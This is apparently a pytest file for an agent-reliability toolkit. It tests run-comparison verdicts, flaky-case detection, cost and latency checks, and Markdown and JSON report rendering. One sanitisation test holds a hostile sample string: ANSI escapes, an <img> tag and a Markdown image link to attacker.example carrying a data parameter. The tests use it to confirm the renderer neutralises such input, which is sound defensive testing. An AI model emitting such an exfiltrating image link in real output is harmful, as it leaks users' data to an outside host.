"""Run comparison verdicts and report rendering."""

from __future__ import annotations

import json

import pytest

from agent_reliability_lab import faulty_agent, load_builtin_suite, reference_agent, run_suite
from agent_reliability_lab.errors import ConfigError
from agent_reliability_lab.judge import MockJudge, builtin_calibration_set, calibrate
from agent_reliability_lab.metrics import compute_metrics
from agent_reliability_lab.models import ModelPrice, PriceTable, RunConfig, RunResult, Suite
from agent_reliability_lab.regression import RegressionReport, compare_runs
from agent_reliability_lab.report import (
    DISCLAIMER,
    fenced,
    inline,
    money,
    number,
    percent,
    plain,
    render_calibration,
    render_comparison,
    render_run_list,
    render_run_report,
    to_json,
)
from agent_reliability_lab.storage import RunInfo

CONFIG = RunConfig(seed=1, trials=3)


@pytest.fixture(scope="module")
def faults() -> Suite:
    return load_builtin_suite("faults")


@pytest.fixture(scope="module")
def baseline(faults: Suite) -> RunResult:
    return run_suite(faults, reference_agent("support-agent", "1.0.0"), CONFIG, run_id="base")


@pytest.fixture(scope="module")
def regressed(faults: Suite) -> RunResult:
    return run_suite(
        faults,
        faulty_agent("no_retry", name="support-agent", version="1.1.0"),
        CONFIG,
        run_id="cand",
    )


# --------------------------------------------------------------------------- comparison


def test_identical_runs_are_never_a_regression(faults: Suite, baseline: RunResult) -> None:
    again = run_suite(faults, reference_agent("support-agent", "1.0.0"), CONFIG, run_id="again")
    report = compare_runs(baseline, again)
    assert report.verdict == "no_change" and report.p_value == 1.0
    assert (report.stopped_passing, report.started_passing) == (0, 0)
    assert report.newly_failing == report.fixed == report.flaky == [] and report.warnings == []
    assert (
        report.latency is not None
        and report.latency.difference == 0.0
        and not report.latency.changed
    )
    assert report.cost is not None and report.cost.low == report.cost.high == 0.0
    same = compare_runs(baseline, baseline)
    assert same.verdict == "no_change"


def test_identical_failing_runs_are_no_change_too(regressed: RunResult) -> None:
    report = compare_runs(regressed, regressed)
    assert report.verdict == "no_change" and len(report.still_failing) == 11


def test_a_real_regression_is_detected_and_explained(
    baseline: RunResult, regressed: RunResult
) -> None:
    report = compare_runs(baseline, regressed)
    assert report.verdict == "regression"
    assert (report.stopped_passing, report.started_passing) == (11, 0)
    assert report.p_value == pytest.approx(2 * 0.5**11)
    assert len(report.newly_failing) == 11 and report.fixed == []
    change = next(item for item in report.newly_failing if item.case_id == "fault-timeout-once")
    assert (change.baseline, change.candidate) == ("pass", "fail")
    assert (change.baseline_passes, change.candidate_passes) == ("3/3", "0/3")
    assert "recovery" in change.failed_evaluators
    assert report.baseline_pass_rate.rate == 1.0 and report.candidate_pass_rate.successes == 4
    assert any("exact McNemar test on 11 vs 0" in reason for reason in report.reasons)
    assert report.latency is not None and report.latency.direction == "lower"


def test_the_reverse_comparison_is_an_improvement_with_a_cost_to_review(
    baseline: RunResult, regressed: RunResult
) -> None:
    report = compare_runs(regressed, baseline)
    assert (report.stopped_passing, report.started_passing) == (0, 11)
    assert len(report.fixed) == 11 and report.newly_failing == []
    assert report.latency is not None and report.latency.direction == "higher"
    assert report.verdict == "needs_review"
    assert any("trade-off" in reason for reason in report.reasons)


def test_a_few_newly_failing_cases_need_review_even_without_significance(
    faults: Suite, baseline: RunResult
) -> None:
    candidate = baseline.model_copy(deep=True)
    candidate.run_id = "few"
    broken = [
        r for r in candidate.results if r.case_id in {"fault-timeout-once", "fault-rate-limit"}
    ]
    for result in broken:
        result.passed = False
    report = compare_runs(baseline, candidate)
    assert (report.stopped_passing, report.p_value) == (2, 0.5)
    assert report.verdict == "needs_review" and len(report.newly_failing) == 2


def test_flaky_cases_are_listed_separately(faults: Suite, baseline: RunResult) -> None:
    flaky_agent = faulty_agent(
        "no_retry", name="support-agent", version="1.2.0", activation_rate=0.5
    )
    candidate = run_suite(faults, flaky_agent, CONFIG, run_id="flaky")
    report = compare_runs(baseline, candidate)
    assert report.flaky, "with a 50% activation rate some cases must be flaky"
    assert all(change.candidate == "flaky" for change in report.flaky)
    assert report.stopped_passing == len(report.newly_failing) + len(report.flaky)
    assert {change.candidate_passes for change in report.flaky} <= {"1/3", "2/3"}


def test_cost_increase_alone_needs_review(faults: Suite, baseline: RunResult) -> None:
    dear = baseline.model_copy(deep=True)
    dear.run_id = "dear"
    for result in dear.results:
        result.estimated_cost_usd = (result.estimated_cost_usd or 0.0) * 1.5
    report = compare_runs(baseline, dear)
    assert report.cost is not None and report.cost.direction == "higher"
    assert report.cost.relative == pytest.approx(0.5) and report.verdict == "needs_review"
    cheaper = compare_runs(dear, baseline)
    assert (
        cheaper.verdict == "improved"
        and cheaper.cost is not None
        and cheaper.cost.direction == "lower"
    )


def test_small_cost_changes_below_the_tolerance_are_ignored(baseline: RunResult) -> None:
    slightly = baseline.model_copy(deep=True)
    for result in slightly.results:
        result.estimated_cost_usd = (result.estimated_cost_usd or 0.0) * 1.05
    report = compare_runs(baseline, slightly)
    assert report.cost is not None and report.cost.low > 0 and not report.cost.changed
    assert report.verdict == "no_change"
    assert compare_runs(baseline, slightly, tolerance=0.01).verdict == "needs_review"


def test_warnings_when_runs_are_not_like_for_like(
    core_suite: Suite, faults: Suite, baseline: RunResult
) -> None:
    other_seed = run_suite(
        faults, reference_agent(), RunConfig(seed=2, trials=2, fault_profile="flaky-tools")
    )
    warnings = compare_runs(baseline, other_seed).warnings
    assert any("different seeds" in text for text in warnings)
    assert any("different number of trials" in text for text in warnings)
    assert any("fault profiles" in text for text in warnings)
    repriced = baseline.model_copy(deep=True)
    repriced.config.prices = PriceTable(
        name="other", models={"sim-1": ModelPrice(input_per_mtok=2, output_per_mtok=2)}
    )
    assert any("price tables" in text for text in compare_runs(baseline, repriced).warnings)
    core = run_suite(core_suite, reference_agent(), CONFIG)
    with pytest.raises(ConfigError, match="no cases in common"):
        compare_runs(baseline, core)


def test_cases_present_in_only_one_run_are_left_out(baseline: RunResult) -> None:
    smaller = baseline.model_copy(deep=True)
    smaller.results = [r for r in smaller.results if r.case_id != "fault-rate-limit"]
    report = compare_runs(baseline, smaller)
    assert report.only_in_baseline == ["fault-rate-limit"] and report.cases_compared == 14
    assert any("only one run" in text for text in report.warnings) and report.verdict == "no_change"


def test_unpriced_runs_skip_the_cost_comparison(faults: Suite) -> None:
    config = RunConfig(prices=PriceTable(name="empty"))
    first = run_suite(faults, reference_agent(), config)
    report = compare_runs(first, first)
    assert report.cost is None and any(
        "cost could not be compared" in text for text in report.warnings
    )


@pytest.mark.parametrize("kwargs", [{"alpha": 0}, {"alpha": 1.5}, {"tolerance": -0.1}])
def test_invalid_comparison_options(baseline: RunResult, kwargs: dict) -> None:
    with pytest.raises(ConfigError):
        compare_runs(baseline, baseline, **kwargs)


def test_comparison_is_deterministic(baseline: RunResult, regressed: RunResult) -> None:
    assert compare_runs(baseline, regressed) == compare_runs(baseline, regressed)
    assert (
        compare_runs(baseline, regressed, seed=5).latency
        != compare_runs(baseline, regressed, seed=6).latency
    )


# --------------------------------------------------------------------------- rendering helpers


def test_plain_and_inline_neutralise_untrusted_text() -> None:
    hostile = (
        "a\x1b[31m|b`c\n![x](https://attacker.example/?d=1) <img src=x> [l](http://e.example)\x00"
    )
    assert (
        plain(hostile)
        == "a|b`c ![x](https://attacker.example/?d=1) <img src=x> [l](http://e.example)"
    )
    safe = inline(hostile)
    assert safe.startswith("`") and safe.endswith("`") and safe.count("`") == 2
    assert "\\|" in safe and "\n" not in safe and "\x1b" not in safe
    assert inline("") == "`(empty)`" and inline("   ") == "`(empty)`"
    assert len(plain("x" * 1000, 50)) < 80


def test_fenced_blocks_cannot_be_closed_by_their_content() -> None:
    body = "before\n```\n# Injected heading\n````\nafter"
    block = fenced(body)
    fence = block.split("\n")[0].removesuffix("text")
    assert len(fence) == 5 and block.endswith(fence) and block.count(fence) == 2
    assert fenced("plain").startswith("```text\nplain\n```")
    assert "\x1b" not in fenced("a\x1b[2Jb")


def test_number_formatting() -> None:
    assert percent(0.9667) == "96.7%" and percent(None) == "n/a"
    assert number(1234.5, 0, " ms") == "1,234 ms" and number(None) == "n/a"
    assert money(0.04632) == "$0.0463" and money(None) == "n/a"


# --------------------------------------------------------------------------- reports


def test_run_report_for_a_clean_run(baseline: RunResult) -> None:
    text = render_run_report(baseline)
    assert text.startswith("# Agent reliability report: `support-agent 1.0.0`")
    for section in (
        "## Summary",
        "## By category",
        "## By evaluator",
        "## Error taxonomy",
        "## Failures (0",
    ):
        assert section in text
    assert DISCLAIMER in text and "No failures." in text and "Cost is an estimate" in text
    assert (
        "| Pass rate (a case passes only if every trial passes every check) | 100.0% (15/15)"
        in text
    )


def test_run_report_lists_failures_with_fenced_output(regressed: RunResult) -> None:
    text = render_run_report(regressed, max_failures=3)
    assert "## Failures (33 case-trial(s))" in text and "30 more failure(s) not shown" in text
    assert "| recovery_failure | 33 |" in text
    assert (
        "- **recovery** / no_retry:" in text
        and "```text\nI could not complete this request" in text
    )
    assert text.count("### ") == 3


def test_run_report_mentions_flaky_cases_and_the_fault_profile(faults: Suite) -> None:
    flaky = faulty_agent("no_retry", activation_rate=0.5)
    run = run_suite(faults, flaky, RunConfig(seed=1, trials=3, fault_profile="flaky-tools"))
    text = render_run_report(run)
    assert "**Flaky cases**" in text and "Fault profile: `flaky-tools`." in text


def test_comparison_report(baseline: RunResult, regressed: RunResult) -> None:
    text = render_comparison(compare_runs(baseline, regressed))
    assert "## Verdict: REGRESSION" in text and "### Newly failing (11)" in text
    assert "| `fault-timeout-once` | timeout | pass (3/3) | fail (0/3) |" in text
    assert "Exact McNemar test (two-sided): p = 0.0010" in text and DISCLAIMER in text
    same = render_comparison(compare_runs(baseline, baseline))
    assert "## Verdict: NO CHANGE" in same and "Newly failing" not in same
    reverse = render_comparison(compare_runs(regressed, baseline))
    assert "### Fixed (11)" in reverse and "## Verdict: NEEDS REVIEW" in reverse


def test_calibration_report() -> None:
    dataset = builtin_calibration_set()
    report = calibrate(MockJudge(), dataset.rubric, dataset.items, dataset=dataset.description)
    text = render_calibration(report)
    assert text.startswith("# Judge calibration: `mock-judge`")
    assert "| Label in the dataset | Judge: pass | Judge: fail | Sent to human review |" in text
    assert (
        "Cohen's kappa" in text
        and "## Disagreements" in text
        and "not annotations collected" in text
    )
    assert "A judge is an opinion with an error rate." in text


def test_run_list_rendering() -> None:
    assert render_run_list([]) == "No stored runs.\n"
    info = RunInfo("run-a", "core", "agent\x1b[31m", "1.0", "2026-11-14T08:00:00Z", 17, 2, 30, 34)
    lines = render_run_list([info]).splitlines()
    assert lines[0].split() == ["RUN", "SUITE", "AGENT", "VERSION", "CREATED", "TRIALS", "PASSED"]
    assert "30/34 (88%)" in lines[1] and "\x1b" not in lines[1]


def test_json_output_round_trips(baseline: RunResult, regressed: RunResult) -> None:
    metrics = json.loads(to_json(compute_metrics(baseline)))
    assert metrics["pass_rate"]["rate"] == 1.0 and metrics["cases"] == 15
    report = compare_runs(baseline, regressed)
    assert RegressionReport.model_validate_json(to_json(report)) == report
